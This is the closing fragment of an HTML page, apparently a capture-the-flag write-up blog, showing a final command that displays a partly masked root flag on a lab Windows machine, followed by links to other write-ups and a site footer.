+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;type root.txt
+</span></span><span style="display:flex;"><span>74ef5d962484b51bc5**************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://theloganlab.github.io/posts/horizontall/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Horizontall - Write up</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/validation/">
+                <span class="button__text">Validation - Write up</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
